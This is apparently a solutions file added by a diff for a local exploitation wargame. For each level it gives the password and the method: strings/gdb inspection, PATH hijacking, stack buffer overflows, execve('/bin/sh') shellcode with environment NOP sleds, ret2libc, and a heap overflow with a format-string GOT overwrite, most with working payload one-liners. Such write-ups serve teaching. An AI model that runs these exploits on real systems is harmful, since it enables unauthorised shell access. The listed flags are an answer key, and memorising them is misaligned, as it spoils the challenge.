@@ -1,0 +1,64 @@
+            Solution 
+Level -1 - (level0) open f12.
+
+Level 0 - (TVeB0MIlx0KB) simply run strings.
+
+Level 1 - (rAWJ@yDbZo4c) examine in gdb what is the string right before strcmp.
+
+Level 2 - (kgg9ki?iDero) examine in gdb what is the string that our pass needs 2 turn to, and the XOR key.
+
+Level 3 - (0LRS6_hjGzCf) simply buffer overflow the admin variable to something not 0. It is 76 bytes after the buffer, so 77 sufficient.
+
+Level 4 - (svNa9463?k4m) compile a binary that runs system("/bin/sh") with the name uname (or any other command that the
+challenge binary uses), and then sets PATH to the path where your executable named uname resides.
+
+Level 5 - (@XpLtpZhqtiG) scan ports from 0x5ad-0xdad (from hint), find that 2989 is open, and then watch tron legacy
+to find out what to enter in the shell. Good movie.
+
+Level 6 - (czO0-Uf#lvhY) simple buffer overflow to overwrite return address to spawn_shell: ./level6 $(python -c "print('A' * 44 + '\x8b\x85\x04\x08')")
+
+Level 7 - (3WlK?GXs$?g+) just simple execve("/bin/sh") shellcode: ./level7 $(python -c 'print("\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
+
+Level 8 - (eWi?FXQ6gFT9) simple FSB, %6$p%7$p%8$p%9$p%10$p was enough. Flip each 4 because LE, and turn hex to ascii till null byte.
+
+Level 9 - (UAqIC=gZ5Ruf) same buffer overflow as level 6, but now it's with fgets and not argv[1], so we pipe the program to file where we write the payload, with cat: cat <payload_file> | ./level9. But then, as the story says, the shell exists, because it inherits stdin from the parent process, and the payload file has reached EOF. What we need to do is use cat <payload_file> -, where - is stdin, so it'll first reach EOF of payload_file, then turn back to stdin. Cool!
+
+Level 10 - (gNaB1_4fgzjP) Ok now we have buffer overflow + shellcode. Our shellcode buffer is very small, in fact just enough for the samllest shellcode I found (24 bytes). So if we just jump to the shellcode on the stack, it will overwrite itself while pushing /bin//sh on the stack. Instead we utilize environement variable spraying, we spray a load of environement variable that contain our shellcode and a massive nop sled:
+
+shellcode="\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+for i in $(seq 1 100);
+do
+    echo $i
+    curr="$(python -c "print('\x90' * 1000 + '$shellcode')")"
+    export n$i=$curr
+done
+
+And then all is left our sol file, which should use 4 at the beggining so the function returns, and then buffer overflow to
+some random in the env variables that is very likely to hit a nop sled:
+
+python -c "print('4' + 'A' * 27 + '\x60\xbd\xff\xff')" > sol
+
+Level 11 - (5STcb$yK+$08) - NX enbaled so no shellcode this time. We need to do ret2libc ROP. There's no ASLR so we can just use libc addresses from GDB... so we put payload, system addr, 4 junk, then /bin/sh in libc address.
+
+python -c "print('A' * 28 + '\x60\x63\xe6\xf7' + 'A' * 4 + '\xA9\x51\xf8\xf7')" > sol
+
+And then cat sol - | /matrix/level11/level11
+
+Level 12 (l2F9@3t0Z2Mx) - chunk B is freed, and we then get strcpy to chunk A, we can overwrite the size of chunk B to 0x108 (or higher) which is BLOCKSIZE * 2 + 0x8 for metadata.
+We utilize the second strcpy to get from chunk B to chunk C, and write in the data of chunk C something useful. What do I mean by useful? well we have FSB (format string bug) in the end, print(c). We'll overwrite the data of c to exploit this FSB:
+
+
+ ./level12 $(python -c "print('/bin/sh;' + 'A' * 124 + '\x08\x01')") $(python -c "print('\xb0\x99\x04\x08' + 'B' * 4 + '\xbc\x99\x04\x08' + 'B' * 4 + '\xbe\x99\x04\x08' + 'B' * 4 + '\xb1\x99\x04\x08' + 'B' * 108 + '%c%c%c%c%c%48c%n%25387c%n%38022c%n%461984c%n')")
+
+This seems monstrous I know, I'll explain:
+
+first arg: /bin/sh; at beggining we'll get to that later. The important part is that it overwrites size of chunk B, so second malloc returns it.
+
+Second arg: Oh that's where the fun begins. We basically include the addresses in the got we wanna overwrite with the FSB. Our plan is to overwrite strcpy with system, and overwrite exit with the address of the pushing of a and call to strcpy. Remember that we put /bin/sh in a, so this'll bring a shell.
+
+But now comes the how. Essentially I just broke down the writing to got since if I were to write all the entire address at once, it'll take a long time to print all the chars lol.
+
+Basically wer first put the first byte of the main addr we want to return to in exit@got.plt: 0x38. Then go one higher up, which is the first part of system, 0x6360 (we need to subtract from that the number of chars already written, since it's the same printf.). Then we do the same for the second part of system, 0xf7ed, and lastly, for the second part of the main addr, 0x80486. Then it will
+essentially call system(a), where a is "/bin/sh;AAAAA...." (that's why I included ;, can input null bytes).
+It was not that easy.
